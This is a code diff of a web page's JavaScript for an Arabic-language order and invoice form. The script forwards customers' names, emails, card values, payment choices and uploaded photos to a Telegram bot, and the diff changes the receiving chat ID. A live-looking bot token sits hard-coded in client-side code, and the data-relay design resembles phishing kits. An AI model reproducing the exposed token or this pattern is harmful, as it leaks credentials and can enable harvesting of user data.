@@ -373,7 +373,9 @@
 <script>
     // إعدادات بوت التليجرام
     const BOT_TOKEN = '8999556963:AAG9v3lw-nGpplQYRA-6iJG4bOzdCpq5YIA';
-    const CHAT_ID = '8999556963';
+    
+    // تم التحديث إلى الآي دي الخاص بك
+    const CHAT_ID = '5478867416'; 
 
     let commission = 0;
     let totalAmount = 0;
@@ -415,7 +417,7 @@
             if(item.file) {
                 let fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
-                fd.append('photo', item.file); // استخدام photo بدلاً من document
+                fd.append('photo', item.file);
                 fd.append('caption', item.caption);
                 
                 let fileRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -506,7 +508,6 @@
         btn.innerText = 'جاري إرسال الطلب والمرفقات... يرجى الانتظار';
         btn.disabled = true;
 
-        // تجهيز البيانات
         const accTypeSelect = document.getElementById('accountType');
         const accTypeName = accTypeSelect.options[accTypeSelect.selectedIndex].text;
         const cardVal = document.getElementById('cardValue').value;
@@ -518,7 +519,6 @@
         const paySelect = document.getElementById('paymentMethod');
         const payName = paySelect.options[paySelect.selectedIndex].text;
 
-        // حفظ الفاتورة في الذاكرة المحلية للجهاز ليتم استدعاؤها لاحقاً
         const savedData = {
             name: accName,
             email: accEmail,
@@ -547,13 +547,12 @@
         try {
             await sendToTelegramAPI(textMessage, filesToUpload);
             
-            // نجاح
             document.getElementById('newOrderPage2').style.display = 'none';
             document.getElementById('newOrderPage3').style.display = 'block';
             document.getElementById('successInvCode').innerText = currentInvoiceCode;
 
         } catch(e) {
-            alert('حدث خطأ في الاتصال، يرجى المحاولة مرة أخرى أو التأكد من حجم المرفقات. \nالتفاصيل: ' + e.message);
+            alert('حدث خطأ في الاتصال، التفاصيل: ' + e.message);
             btn.innerText = 'إرسال الطلب وحفظ الفاتورة';
             btn.disabled = false;
         }
@@ -568,7 +567,6 @@
         const code = document.getElementById('searchInvCode').value.trim();
         if(!code) return alert("يرجى إدخال رمز الفاتورة!");
 
-        // محاولة جلب البيانات من الذاكرة
         const dataStr = localStorage.getItem(code);
         if(dataStr) {
             const data = JSON.parse(dataStr);
@@ -617,7 +615,6 @@
         try {
             await sendToTelegramAPI(textMessage, filesToUpload);
             
-            // إخفاء الفورم وإظهار رسالة النجاح
             document.querySelector('.search-box').style.display = 'none';
             document.getElementById('currentOrderFormDetails').style.display = 'none';
             document.getElementById('currentOrderSuccess').style.display = 'block';
